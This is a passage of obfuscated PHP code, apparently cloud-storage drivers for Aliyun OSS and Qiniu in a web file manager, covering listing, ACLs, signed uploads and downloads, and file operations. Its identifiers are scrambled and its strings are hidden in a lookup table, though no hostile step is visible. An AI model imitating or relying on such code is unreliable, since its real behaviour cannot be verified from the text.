$†õ˜¥´‹[$¦çÙ­…ú[1443]] + 0, $¦çÙ­…ú[1442] => $†õ˜¥´‹[$¦çÙ­…ú[1442]]); } if (isset($õø®ÈŠ[$¦çÙ­…ú[1442]]) && $õø®ÈŠ[$¦çÙ­…ú[1442]]) { $ç âŸê©[$¦çÙ­…ú[231]] = trim($õø®ÈŠ[$¦çÙ­…ú[1442]], $¦çÙ­…ú[120]); } if (isset($õø®ÈŠ[$¦çÙ­…ú[78]])) { $ç âŸê©[$¦çÙ­…ú[78]] = $õø®ÈŠ[$¦çÙ­…ú[78]]; } if (isset($õø®ÈŠ[$¦çÙ­…ú[87]])) { $ç âŸê©[$¦çÙ­…ú[87]] = $õø®ÈŠ[$¦çÙ­…ú[87]]; } if (isset($õø®ÈŠ[$¦çÙ­…ú[196]]) && !trim($ç âŸê©[$¦çÙ­…ú[87]])) { $ç âŸê©[$¦çÙ­…ú[87]] = $õø®ÈŠ[$¦çÙ­…ú[196]]; } return $ç âŸê©; } private function folderInfo($á¯ûíÁŸ, $Ş°Â—ğ = false, $É¡İÓƒ¢ = array()) { $ ×š•Ã€ =& $_SERVER[ú‡®¯¨±]; $Ó×ˆêØ‘ = array($ ×š•Ã€[32] => $this->pathThis($á¯ûíÁŸ), $ ×š•Ã€[86] => $this->getPathOuter($ ×š•Ã€[8] . $á¯ûíÁŸ), $ ×š•Ã€[33] => $ ×š•Ã€[77]); if ($Ş°Â—ğ) { return $Ó×ˆêØ‘; } $Ó×ˆêØ‘[$ ×š•Ã€[227]] = $Ó×ˆêØ‘[$ ×š•Ã€[87]] = 0; $Ó×ˆêØ‘[$ ×š•Ã€[228]] = $Ó×ˆêØ‘[$ ×š•Ã€[229]] = !0; if (empty($É¡İÓƒ¢)) { $á¯ûíÁŸ = rtrim($á¯ûíÁŸ, $ ×š•Ã€[8]) . $ ×š•Ã€[8]; $õ€µ–íÔ = $this->objectMeta($á¯ûíÁŸ); if (!$õ€µ–íÔ) { return $Ó×ˆêØ‘; } $É¡İÓƒ¢ = array($ ×š•Ã€[227] => $õ€µ–íÔ[$ ×š•Ã€[554]][$ ×š•Ã€[1451]], $ ×š•Ã€[87] => strtotime($õ€µ–íÔ[$ ×š•Ã€[1444]])); } if (isset($É¡İÓƒ¢[$ ×š•Ã€[87]])) { $Ó×ˆêØ‘[$ ×š•Ã€[87]] = $É¡İÓƒ¢[$ ×š•Ã€[87]]; } if (isset($É¡İÓƒ¢[$ ×š•Ã€[227]])) { $Ó×ˆêØ‘[$ ×š•Ã€[227]] = $É¡İÓƒ¢[$ ×š•Ã€[227]]; } return $Ó×ˆêØ‘; } public function listPath($¸Ù¨ÇÎ¸, $ãªêäï = false) { $¹ÏÓ»Ä» =& $_SERVER[ú‡®¯¨±]; $­è…˜ ½ = $this->fileList($¸Ù¨ÇÎ¸, $¹ÏÓ»Ä»[8], !0); foreach ($­è…˜ ½[$¹ÏÓ»Ä»[84]] as $ËÚïïÛÚ => $ÕûÁ áˆ) { $­è…˜ ½[$¹ÏÓ»Ä»[84]][$ËÚïïÛÚ] = $this->folderInfo($ÕûÁ áˆ, $ãªêäï, $ÕûÁ áˆ); } foreach ($­è…˜ ½[$¹ÏÓ»Ä»[85]] as $ËÚïïÛÚ => $ÕûÁ áˆ) { $­è…˜ ½[$¹ÏÓ»Ä»[85]][$ËÚïïÛÚ] = $this->fileInfo($ÕûÁ áˆ[$¹ÏÓ»Ä»[32]], $ãªêäï, $ÕûÁ áˆ); } return $­è…˜ ½; } protected function infoChildren($¿ˆ¯…¸÷, &$”×‚ËĞƒ) { $ €É³ãû =& $_SERVER[ú‡®¯¨±]; $¾õœœ÷£ = $this->fileList($¿ˆ¯…¸÷, $ €É³ãû[12], !0); $”×‚ËĞƒ[$ €É³ãû[80]] += count($¾õœœ÷£[$ €É³ãû[84]]); $”×‚ËĞƒ[$ €É³ãû[79]] += count($¾õœœ÷£[$ €É³ãû[85]]); foreach ($¾õœœ÷£[$ €É³ãû[85]] as $©ø¬°ñá) { if (!$©ø¬°ñá || !$©ø¬°ñá[$ €É³ãû[78]]) { continue; } $”×‚ËĞƒ[$ €É³ãû[78]] += $©ø¬°ñá[$ €É³ãû[78]]; } } public function has($³Ïè¼ı, $üŠâ“ö§ = false, $Ø¶ÉÙåˆ = true) { $³¤‰Œ—ñ =& $_SERVER[ú‡®¯¨±]; $³Ïè¼ı = trim($³Ïè¼ı, $³¤‰Œ—ñ[8]); $¬Î¾­ë = empty($³Ïè¼ı) && $³Ïè¼ı !== $³¤‰Œ—ñ[224] ? $³¤‰Œ—ñ[12] : $³Ïè¼ı . $³¤‰Œ—ñ[8]; $»êÃë¤Ü = $³¤‰Œ—ñ[12]; $¿ÌšŞÄù = 500; $€õµ¿œ¢ = $Ü‡ìÆØ° = 0; while (!0) { check_abort(); $í¨Éš = array($³¤‰Œ—ñ[1438] => $³¤‰Œ—ñ[8], $³¤‰Œ—ñ[1439] => $¬Î¾­ë, $³¤‰Œ—ñ[1440] => $¿ÌšŞÄù, $³¤‰Œ—ñ[1441] => $»êÃë¤Ü); try { $¤¿¸×­” = $this->client->listObjects($this->bucket, $í¨Éš); } catch (OSS\Core\OssException $ç¹ì”Òœ) { break; } $»êÃë¤Ü = $¤¿¸×­”->getNextMarker(); $Œô²²•ô = $¤¿¸×­”->getObjectList(); $ŒÈ„™í = $¤¿¸×­”->getPrefixList(); if ($üŠâ“ö§) { if (count($Œô²²•ô) > 1 || count($Œô²²•ô) == 1 && $Œô²²•ô[0]->getKey() != $¬Î¾­ë) { $€õµ¿œ¢ += count($Œô²²•ô) - 1; } if (!empty($ŒÈ„™í)) { $Ü‡ìÆØ° += count($ŒÈ„™í); } if ($»êÃë¤Ü === $³¤‰Œ—ñ[12]) { break; } continue; } if ($Ø¶ÉÙåˆ) { if (!empty($Œô²²•ô)) { if (count($Œô²²•ô) > 1 || $Œô²²•ô[0]->getKey() != $¬Î¾­ë) { return !0; } } } else { if (!empty($ŒÈ„™í)) { return !0; } } if ($»êÃë¤Ü === $³¤‰Œ—ñ[12]) { break; } } if ($üŠâ“ö§) { return array($³¤‰Œ—ñ[235] => $€õµ¿œ¢, $³¤‰Œ—ñ[236] => $Ü‡ìÆØ°); } return !1; } public function listAll($¬ıÁ—ß¼) { $ÔäÏ•Â¤ =& $_SERVER[ú‡®¯¨±]; $Ë“’À„å = $this->fileList($¬ıÁ—ß¼, $ÔäÏ•Â¤[12], !0); $’ı²„Ø¼ = array_to_keyvalue($Ë“’À„å[$ÔäÏ•Â¤[85]], $ÔäÏ•Â¤[32]); foreach ($Ë“’À„å[$ÔäÏ•Â¤[84]] as $·áˆ‹õı) { if (is_string($·áˆ‹õı)) { $’ı²„Ø¼[$·áˆ‹õı] = array($ÔäÏ•Â¤[78] => 0); } } return $this->listAllFiles($¬ıÁ—ß¼, $’ı²„Ø¼); } public function canRead($ã­çÓÒ«) { $±ùÎëî =& $_SERVER[ú‡®¯¨±]; $ì¶¶­Õ = $this->pathAcl($ã­çÓÒ«); return $ì¶¶­Õ == $±ùÎëî[1452] || $ì¶¶­Õ == $±ùÎëî[597] ? !0 : !1; } public function canWrite($¶ıúÜŒ«) { $ºÕø–õ– = $this->pathAcl($¶ıúÜŒ«); return $ºÕø–õ– == $_SERVER[ú‡®¯¨±][597] ? !0 : !1; } public function pathAcl($Æî¹³ €) { $À·³Ô„³ =& $_SERVER[ú‡®¯¨±]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $«•ô¾ÒŠ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($Æî¹³ €)); } catch (OSS\Core\OssException $İŸöÍå°) { return !1; } $›äÈ»¬ó = $«•ô¾ÒŠ == $À·³Ô„³[37] ? $this->bucketAcl : $«•ô¾ÒŠ; if ($›äÈ»¬ó == $À·³Ô„³[1453]) { return $À·³Ô„³[1452]; } if ($›äÈ»¬ó == $À·³Ô„³[1454]) { return $À·³Ô„³[597]; } return $›äÈ»¬ó; } private function chmodPath($¢ŸÔÚõ, $à¾‰àºÆ = '') { $³¼û€”¹ =& $_SERVER[ú‡®¯¨±]; $îÔÓÀŠ¼ = empty($à¾‰àºÆ) ? $³¼û€”¹[1454] : $à¾‰àºÆ; $ñ‚ê¡ÒÖ = array($³¼û€”¹[37], $³¼û€”¹[225], $³¼û€”¹[1453], $³¼û€”¹[1454]); if (!in_array($îÔÓÀŠ¼, $ñ‚ê¡ÒÖ)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($¢ŸÔÚõ), $îÔÓÀŠ¼); } catch (OSS\Core\OssException $¢˜Úåİ) { return !1; } return !0; } public function getContent($Ó•À’) { return $this->fileSubstr($Ó•À’, -1); } public function setContent($«›´Í¤, $îãØÁÓ = '') { $®–Œ§Ê¼ =& $_SERVER[ú‡®¯¨±]; try { $ƒø‡ßì× = $this->trafficLimit($®–Œ§Ê¼[1455]); $‘É—  = $this->client->putObject($this->bucket, $this->pathEncode($«›´Í¤), $îãØÁÓ, $ƒø‡ßì×); } catch (OSS\Core\OssException $›¤Í) { return !1; } $Æ¡åÒÛ™ = array($®–Œ§Ê¼[1445] => trim($‘É— [$®–Œ§Ê¼[1442]], $®–Œ§Ê¼[120]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($«›´Í¤))); $this->updateObjMeta($«›´Í¤, $Æ¡åÒÛ™); return isset($‘É— [$®–Œ§Ê¼[1456]][$®–Œ§Ê¼[286]]) ? !0 : !1; } private function updateObjMeta($…”µŠ€ó, $†šÖÄëÈ) { $…”µŠ€ó = $this->pathEncode($…”µŠ€ó); try { $À±Áä¸ğ = array(OSS\OssClient::OSS_HEADERS => $†šÖÄëÈ); $this->client->copyObject($this->bucket, $…”µŠ€ó, $this->bucket, $…”µŠ€ó, $À±Áä¸ğ); } catch (OSS\Core\OssException $Êİï÷»§) { return !1; } return !0; } public function upload($‘ç¼¡Ù­, $²¾—ìÑÍ, $³‡Ì×ËÜ = false, $Ğç ÁÊª = REPEAT_REPLACE) { $ ¾ıÊÆ¼ =& $_SERVER[ú‡®¯¨±]; $Ù’«…çÚ = trim($‘ç¼¡Ù­, $ ¾ıÊÆ¼[8]); $ù¶şÆ‰§ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($ ¾ıÊÆ¼[1445] => @md5_file($²¾—ìÑÍ)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($‘ç¼¡Ù­))); $ù¶şÆ‰§ = $this->trafficLimit($ ¾ıÊÆ¼[1455], $ù¶şÆ‰§); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($Ù’«…çÚ), $²¾—ìÑÍ, $ù¶şÆ‰§); } catch (OSS\Core\OssException $€Şü­Ò) { return !1; } return $this->getPathOuter($‘ç¼¡Ù­); } public function getHost() { $¯¢Ï©Ø =& $_SERVER[ú‡®¯¨±]; $·¥¼ßÆ¶ = explode($¯¢Ï©Ø[200], parent::getHost()); return $·¥¼ßÆ¶[0] . $¯¢Ï©Ø[200] . $this->bucket . $¯¢Ï©Ø[10] . $·¥¼ßÆ¶[1]; } public function uploadFormData($˜ƒÛüÓ’, $Û„¬»ÕÈ = 3600) { $Ó›ÚâÓƒ =& $_SERVER[ú‡®¯¨±]; if (!($Î­ò³ = $this->getHost())) { return !1; } $Ñ×²’ó = $Û„¬»ÕÈ; $áÉÂï¼û = date($Ó›ÚâÓƒ[1457], time() + $Ñ×²’ó); $ÀÁ£Åşª = new DateTime($áÉÂï¼û); $ñ£ÈÒ¡Ø = $ÀÁ£Åşª->format(DateTime::ISO8601); $ÔØàÀ±Ü = strpos($ñ£ÈÒ¡Ø, $Ó›ÚâÓƒ[351]); $ñ£ÈÒ¡Ø = substr($ñ£ÈÒ¡Ø, 0, $ÔØàÀ±Ü) . $Ó›ÚâÓƒ[1458]; $¦äŒ´ÂŞ = 1048576000 * 5; $à¶›éé‹ = $this->pathFather($˜ƒÛüÓ’); $ƒ˜Æ¸ê× = array($Ó›ÚâÓƒ[269] => $ñ£ÈÒ¡Ø, $Ó›ÚâÓƒ[272] => array(array($Ó›ÚâÓƒ[1459], 0, $¦äŒ´ÂŞ), array($Ó›ÚâÓƒ[275], $Ó›ÚâÓƒ[276], $à¶›éé‹))); $ˆ®¨Êê  = base64_encode(json_encode($ƒ˜Æ¸ê×)); $ÆŞÓ¦èœ = base64_encode(hash_hmac($Ó›ÚâÓƒ[258], $ˆ®¨Êê , $this->secret, !0)); $£†Ô†õÑ = array($Ó›ÚâÓƒ[287] => $ˆ®¨Êê , $Ó›ÚâÓƒ[1460] => $this->accessKey, $Ó›ÚâÓƒ[279] => $Ó›ÚâÓƒ[268], $Ó›ÚâÓƒ[1461] => $ÆŞÓ¦èœ, $Ó›ÚâÓƒ[198] => $Î­ò³); $£†Ô†õÑ = $this->trafficLimit($Ó›ÚâÓƒ[1455], $£†Ô†õÑ); return $£†Ô†õÑ; } public function multiUploadFormData($Ù®­´Í—, $£°ã³Ëâ = 3600) { $Šş’Ï¨‹ =& $_SERVER[ú‡®¯¨±]; if (!($§±ƒ„æÈ = $this->getHost())) { return !1; } $İŸ÷§•Ì = $this->trafficLimit($Šş’Ï¨‹[1455]); $Ï¹Úêğ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($Ù®­´Í—), $İŸ÷§•Ì); return array($Šş’Ï¨‹[250] => $Ï¹Úêğ, $Šş’Ï¨‹[198] => $§±ƒ„æÈ . $Šş’Ï¨‹[8] . $this->pathEncode($Ù®­´Í—), $Šş’Ï¨‹[251] => gmdate($Šş’Ï¨‹[1462]), $Šş’Ï¨‹[96] => $Ù®­´Í—); } public function multiUploadAuthData($±€Ûáş, $òüâºğß = array()) { $µ­àÍÒÏ =& $_SERVER[ú‡®¯¨±]; $öÓíãç¶ = isset($òüâºğß[$µ­àÍÒÏ[251]]) ? $òüâºğß[$µ­àÍÒÏ[251]] : gmdate($µ­àÍÒÏ[1462]); $³à‚˜Ü¹ = isset($òüâºğß[$µ­àÍÒÏ[177]]) ? $òüâºğß[$µ­àÍÒÏ[177]] : $µ­àÍÒÏ[12]; $ÀÛëÕ©ö = $±€Ûáş; if (isset($òüâºğß[$µ­àÍÒÏ[96]])) { $ÀÛëÕ©ö = $òüâºğß[$µ­àÍÒÏ[96]]; unset($òüâºğß[$µ­àÍÒÏ[96]]); } if (isset($òüâºğß[$µ­àÍÒÏ[252]])) { $òüâºğß[$µ­àÍÒÏ[251]] = $öÓíãç¶; return $this->listUploadParts($ÀÛëÕ©ö, $òüâºğß); } $¯˜ù”ŠÚ = array($µ­àÍÒÏ[253], $µ­àÍÒÏ[12], $µ­àÍÒÏ[122], $öÓíãç¶, "\170\x2d\157\163\x73\55\x64\x61\x74\145\72{$öÓíãç¶}", $µ­àÍÒÏ[8] . $this->bucket . $µ­àÍÒÏ[8] . $ÀÛëÕ©ö . $³à‚˜Ü¹); if (strpos($³à‚˜Ü¹, $µ­àÍÒÏ[254]) === 0) { $¯˜ù”ŠÚ[0] = $µ­àÍÒÏ[255]; if ($æÑôøã¼ = $this->trafficLimit($µ­àÍÒÏ[1455])) { $ÀÛëÕ©ö = $µ­àÍÒÏ[1463]; array_splice($¯˜ù”ŠÚ, 5, 0, $ÀÛëÕ©ö . $µ­àÍÒÏ[4] . $æÑôøã¼[$ÀÛëÕ©ö]); } } if (isset($òüâºğß[$µ­àÍÒÏ[256]]) && $òüâºğß[$µ­àÍÒÏ[256]] == $µ­àÍÒÏ[257]) { $¯˜ù”ŠÚ[0] = $µ­àÍÒÏ[257]; } if (!empty($òüâºğß[$µ­àÍÒÏ[1464]])) { $¿øé¸ = array_merge(array($¯˜ù”ŠÚ[4]), $òüâºğß[$µ­àÍÒÏ[1464]]); sort($¿øé¸); $¯˜ù”ŠÚ[4] = implode($µ­àÍÒÏ[207], $¿øé¸); } $ûÑ½Å¼ˆ = implode($µ­àÍÒÏ[207], $¯˜ù”ŠÚ); $«úï ¡ó = base64_encode(hash_hmac($µ­àÍÒÏ[258], $ûÑ½Å¼ˆ, $this->secret, !0)); $ò“ø‚ù± = $µ­àÍÒÏ[1428] . $this->accessKey . $µ­àÍÒÏ[4] . $«úï ¡ó; if (strpos($³à‚˜Ü¹, $µ­àÍÒÏ[254]) === 0) { $ò“ø‚ù± = array($µ­àÍÒÏ[260] => $ò“ø‚ù±, $µ­àÍÒÏ[251] => $öÓíãç¶); if ($æÑôøã¼) { $ò“ø‚ù± = array_merge($ò“ø‚ù±, $æÑôøã¼); } } return $ò“ø‚ù±; } public function listUploadParts($‚ß±àµµ, $ˆêÊÛ«¢) { $‰Ò©’çğ =& $_SERVER[ú‡®¯¨±]; $°ÆùÑâÎ = parse_url_query($ˆêÊÛ«¢[$‰Ò©’çğ[177]]); $ï±Í¥şÛ = $this->client->listParts($this->bucket, $this->pathEncode($‚ß±àµµ), $°ÆùÑâÎ[$‰Ò©’çğ[250]]); $‚©ğ½ » = $ï±Í¥şÛ->getListPart(); $„ïœçÜ‡ = array(); foreach ($‚©ğ½ » as $Ï¤ÌÍ¤ë) { $„ïœçÜ‡[] = array($‰Ò©’çğ[1449] => $Ï¤ÌÍ¤ë->getPartNumber(), $‰Ò©’çğ[1450] => trim($Ï¤ÌÍ¤ë->getETag(), $‰Ò©’çğ[120])); } unset($ˆêÊÛ«¢[$‰Ò©’çğ[252]], $ˆêÊÛ«¢[$‰Ò©’çğ[256]]); $·¡ö­ß = $this->multiUploadAuthData($‚ß±àµµ, $ˆêÊÛ«¢); if (empty($·¡ö­ß)) { return !1; } return array($‰Ò©’çğ[260] => $·¡ö­ß, $‰Ò©’çğ[251] => $ˆêÊÛ«¢[$‰Ò©’çğ[251]], $‰Ò©’çğ[262] => $„ïœçÜ‡); } public function download($ú—³àÓ×, $¡‘ç¥ü†) { if ($this->isFolder($ú—³àÓ×)) { return !1; } try { $£…˜‚äÜ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $¡‘ç¥ü†); $£…˜‚äÜ = $this->trafficLimit($_SERVER[ú‡®¯¨±][111], $£…˜‚äÜ); $this->client->getObject($this->bucket, $this->pathEncode($ú—³àÓ×), $£…˜‚äÜ); } catch (OSS\Core\OssException $·¥øÆ›) { return !1; } return $¡‘ç¥ü†; } public function fileSubstr($˜‰ÍÑá¦, $“ª±Øâˆ = 0, $Ş„—Ãè = false) { if ($“ª±Øâˆ === -1) { $½‹—Î§“ = array(); } else { if ($Ş„—Ãè === !1) { $”È†éà = $this->size($˜‰ÍÑá¦); } else { $”È†éà = $“ª±Øâˆ + $Ş„—Ãè - 1; } $½‹—Î§“ = array(OSS\OssClient::OSS_RANGE => "{$“ª±Øâˆ}\55{$”È†éà}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($˜‰ÍÑá¦), $½‹—Î§“); } catch (OSS\Core\OssException $İ¤ìœ®¯) { think_exception($İ¤ìœ®¯->getMessage()); return !1; } } private function trafficLimit($ÅšÆš¼¾, $Ù¦”¤ô = array()) { $ŠáÇ…† =& $_SERVER[ú‡®¯¨±]; if ($ÅšÆš¼¾ == $ŠáÇ…†[1455] && $this->isUploadServer() || $ÅšÆš¼¾ == $ŠáÇ…†[111] && $this->isFileOutServer()) { return $Ù¦”¤ô; } $öÇ’»–ü = floatval($GLOBALS[$ŠáÇ…†[6]][$ŠáÇ…†[91]][$ŠáÇ…†[109]][$ÅšÆš¼¾]) * 1024 * 1024 * 8; if (!$öÇ’»–ü) { return $Ù¦”¤ô; } $öÇ’»–ü = $öÇ’»–ü < 819200 ? 819200 : ($öÇ’»–ü > 838860800 ? 838860800 : $öÇ’»–ü); $Ù¦”¤ô[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($öÇ’»–ü); return $Ù¦”¤ô; } public function link($È¾»³å¸, $³ÀÖÓŸ = array()) { $Ä¥ÇÔ€È =& $_SERVER[ú‡®¯¨±]; if (!$this->exist($È¾»³å¸) || $this->isFolder($È¾»³å¸)) { return !1; } try { $³ÀÖÓŸ = $this->trafficLimit($Ä¥ÇÔ€È[111], $³ÀÖÓŸ); $°‚¢ïÈ = $this->client->signUrl($this->bucket, $this->pathEncode($È¾»³å¸), 3600 * 12, $Ä¥ÇÔ€È[257], $³ÀÖÓŸ); return $this->getCdnLink($°‚¢ïÈ); } catch (OSS\Core\OssException $ÔàÌÍ§º) { return !1; } } public function fileOut($§ÑŠ•ò, $Ì‚ÑÍ£ò = false, $µ¨©Ï´¥ = false, $¾±±³Ïµ = '') { $ÖİñÙš =& $_SERVER[ú‡®¯¨±]; if ($this->isFileOutServer()) { return $this->fileOutServer($§ÑŠ•ò, $Ì‚ÑÍ£ò, $µ¨©Ï´¥, $¾±±³Ïµ); } if (!$µ¨©Ï´¥) { $µ¨©Ï´¥ = $this->pathThis($§ÑŠ•ò); } $µ¨©Ï´¥ = rawurlencode($µ¨©Ï´¥); $‰Óˆİ¶Ä = get_file_mime(get_path_ext($µ¨©Ï´¥)); if ($‰Óˆİ¶Ä == $ÖİñÙš[244]) { return parent::fileOut($§ÑŠ•ò, $Ì‚ÑÍ£ò, $µ¨©Ï´¥, $¾±±³Ïµ); } $Ì‚ÑÍ£ò = $Ì‚ÑÍ£ò ? $ÖİñÙš[1465] : $ÖİñÙš[1466]; $ˆ¦Âóšä = array(OSS\OssClient::OSS_SUB_RESOURCE => $ÖİñÙš[1467] . rawurlencode("{$Ì‚ÑÍ£ò}\73\146\151\x6c\x65\x6e\141\155\x65\75{$µ¨©Ï´¥}")); $ˆ¦Âóšä[OSS\OssClient::OSS_SUB_RESOURCE] .= $ÖİñÙš[1468] . rawurlencode($‰Óˆİ¶Ä); $üÒ«¬ÊŒ = $this->link($§ÑŠ•ò, $ˆ¦Âóšä); $this->fileOutLink($üÒ«¬ÊŒ); } public function fileOutServer($É¿ ß, $†ŠŒÂ· = false, $®ÎØ­’ò = false, $±¸ßÌÕÁ = '') { parent::fileOut($É¿ ß, $†ŠŒÂ·, $®ÎØ­’ò, $±¸ßÌÕÁ); } public function fileOutImage($£…¡²ƒ¾, $¥åı©Ä = 250) { if ($this->size($£…¡²ƒ¾) > 1024 * 1024 * 20) { return $this->fileOutImageServer($£…¡²ƒ¾, $¥åı©Ä); } $×«¥¨ = array(OSS\OssClient::OSS_PROCESS => $_SERVER[ú‡®¯¨±][1425] . $¥åı©Ä); $¦Ğ÷Ñä‘ = $this->link($£…¡²ƒ¾, $×«¥¨); $this->fileOutLink($¦Ğ÷Ñä‘); } public function fileOutImageServer($ˆÏŒÃ¿, $øÂ‘¼’ê = 250) { parent::fileOutImage($ˆÏŒÃ¿, $øÂ‘¼’ê); } public function fileOutLink($ª»ĞÑ¬µ) { $“·¶„Ó¢ =& $_SERVER[ú‡®¯¨±]; if (!$this->isCdnHost() && substr($ª»ĞÑ¬µ, 0, 7) == $“·¶„Ó¢[1387]) { $ª»ĞÑ¬µ = $“·¶„Ó¢[1388] . substr($ª»ĞÑ¬µ, 7); } header($“·¶„Ó¢[164] . $ª»ĞÑ¬µ); die; } public function hashMd5($£‡Ó”«À, $ÒŞÂ›Ò = '') { $İºƒ–íâ =& $_SERVER[ú‡®¯¨±]; $‘Ü­çÛı = $this->_objectMeta($£‡Ó”«À); if (!$‘Ü­çÛı) { return $İºƒ–íâ[12]; } if (!isset($‘Ü­çÛı[$İºƒ–íâ[1445]]) && !empty($ÒŞÂ›Ò)) { $ñ§¯Êì‡ = $this->updateObjMeta($£‡Ó”«À, array($İºƒ–íâ[1445] => $ÒŞÂ›Ò)); $‘Ü­çÛı[$İºƒ–íâ[1445]] = $ñ§¯Êì‡ ? $ÒŞÂ›Ò : $İºƒ–íâ[12]; } return isset($‘Ü­çÛı[$İºƒ–íâ[1445]]) ? strtolower($‘Ü­çÛı[$İºƒ–íâ[1445]]) : $İºƒ–íâ[12]; } public function size($ß²ŞÁÕı) { $ˆ¹š‡ä = $this->objectMeta($ß²ŞÁÕı); return $ˆ¹š‡ä ? $ˆ¹š‡ä[$_SERVER[ú‡®¯¨±][78]] : 0; } public function info($¤îİ©‡ô) { if ($this->isFolder($¤îİ©‡ô)) { return $this->folderInfo($¤îİ©‡ô); } else { if ($this->isFile($¤îİ©‡ô)) { return $this->fileInfo($¤îİ©‡ô); } } return !1; } public function exist($Ÿµ½Ú´Á) { return $this->isFile($Ÿµ½Ú´Á) || $this->isFolder($Ÿµ½Ú´Á); } public function isFile($†Ñ•Î‡‚) { return !$this->isFolder($†Ñ•Î‡‚) && $this->objectMeta($†Ñ•Î‡‚); } public function isFolder($¡°áà‘ı) { return $this->cacheMethod($_SERVER[ú‡®¯¨±][168], $¡°áà‘ı); } protected function objectMeta($ÚåğÅ˜) { return $this->cacheMethod($_SERVER[ú‡®¯¨±][170], $ÚåğÅ˜); } protected function _objectMeta($£íüÕ±Œ) { $ÂÒé Å¡ =& $_SERVER[ú‡®¯¨±]; try { $¼ÑËÈ­² = $this->client->getObjectMeta($this->bucket, $this->pathEncode($£íüÕ±Œ)); } catch (OSS\Core\OssException $ÎÇ¸ù) { $¼ÑËÈ­² = !1; } if ($¼ÑËÈ­²) { $¼ÑËÈ­²[$ÂÒé Å¡[78]] = intval($¼ÑËÈ­²[$ÂÒé Å¡[1443]]); } return $¼ÑËÈ­²; } protected function _isFolder($¯İüÆÈ) { $á½íûÌí =& $_SERVER[ú‡®¯¨±]; if ($¯İüÆÈ == $á½íûÌí[12] || $¯İüÆÈ == $á½íûÌí[8]) { return !0; } $ŞøÑì©© = array($á½íûÌí[1438] => $á½íûÌí[8], $á½íûÌí[1439] => rtrim($¯İüÆÈ, $á½íûÌí[8]) . $á½íûÌí[8], $á½íûÌí[1440] => 1, $á½íûÌí[1441] => $á½íûÌí[12]); $º³ˆÇ„ = $this->client->listObjects($this->bucket, $ŞøÑì©©); if ($º³ˆÇ„->getObjectList() || $º³ˆÇ„->getPrefixList()) { return !0; } return !1; } } class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $bucketManager = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($ê¨÷×Û”) { parent::__construct(); require_once SDK_DIR . $_SERVER[ú‡®¯¨±][1469]; $this->_init($ê¨÷×Û”); } public function _init($¦¡ö¥¦£) { $Èı®ŠÃ =& $_SERVER[ú‡®¯¨±]; $this->config = $¦¡ö¥¦£; foreach ($¦¡ö¥¦£ as $¡”ïûß¦ => $Ì´êºÌ) { if (isset($this->{$¡”ïûß¦})) { $this->{$¡”ïûß¦} = $Ì´êºÌ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($Èı®ŠÃ[1470] . LNG($Èı®ŠÃ[1429])); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->configView = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->configView); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($«âãşÅ, $Œ‰ÈÔ±ü = '', $Î¾“Ÿä = REPEAT_RENAME) { if ($this->setContent($«âãşÅ, $Œ‰ÈÔ±ü)) { return $this->getPathOuter($«âãşÅ); } return !1; } public function mkdir($á÷‹Š²¨, $Ñ»Õ½³œ = REPEAT_SKIP) { $»Ü…Û¹ô =& $_SERVER[ú‡®¯¨±]; $ºÈÀôúı = trim($á÷‹Š²¨, $»Ü…Û¹ô[8]); if ($this->_isFolder($ºÈÀôúı)) { return $this->getPathOuter($ºÈÀôúı); } $á÷‹Š²¨ = $ºÈÀôúı . $»Ü…Û¹ô[8]; $­ÏÈôŞ¶ = get_path_this($ºÈÀôúı); $¯ÙĞÑæõ = $á÷‹Š²¨ . $­ÏÈôŞ¶; if (!$this->mkfile($¯ÙĞÑæõ)) { return !1; } if (!$this->moveFile($¯ÙĞÑæõ, $á÷‹Š²¨)) { $this->delFile($¯ÙĞÑæõ); return !1; } return $this->getPathOuter($ºÈÀôúı); } public function copyFile($Åí°à, $Øµ¿Üçé) { $ÓÀÃååÌ = $this->bucketManager->copy($this->bucket, $Åí°à, $this->bucket, $Øµ¿Üçé, !0); return $ÓÀÃååÌ ? !1 : $this->getPathOuter($Øµ¿Üçé); } public function moveFile($Ø»Ò‡Ê–, $îªåÄ‘ç) { $Ë­·œÙ = $this->bucketManager->move($this->bucket, $Ø»Ò‡Ê–, $this->bucket, $îªåÄ‘ç, !0); return $Ë­·œÙ ? !1 : $this->getPathOuter($îªåÄ‘ç); } public function delFile($­­’Ïİ²) { if (!$this->exist($­­’Ïİ²)) { return !0; } $ŒåşÇ‡” = $this->bucketManager->delete($this->bucket, $­­’Ïİ²); return $ŒåşÇ‡” ? !1 : !0; } public function delFolder($Œ·”£˜Ä) { $•¼Ç‹Úå =& $_SERVER[ú‡®¯¨±]; if (!$this->exist($Œ·”£˜Ä)) { return !0; } $this->listItemCache = !1; $ÛšìÓ = $this->fileList($Œ·”£˜Ä); $this->listItemCache = !0; $±Ë¦é¢ù = trim($Œ·”£˜Ä, $•¼Ç‹Úå[8]) . $•¼Ç‹Úå[8]; if (!empty($Œ·”£˜Ä) && $Œ·”£˜Ä !== $•¼Ç‹Úå[224] && !in_array($±Ë¦é¢ù, $ÛšìÓ[$•¼Ç‹Úå[84]])) { $ÛšìÓ[$•¼Ç‹Úå[84]][] = $±Ë¦é¢ù; } $¿õÔ‹å» = $this->delByBatch($ÛšìÓ[$•¼Ç‹Úå[85]]); if (!$¿õÔ‹å») { return 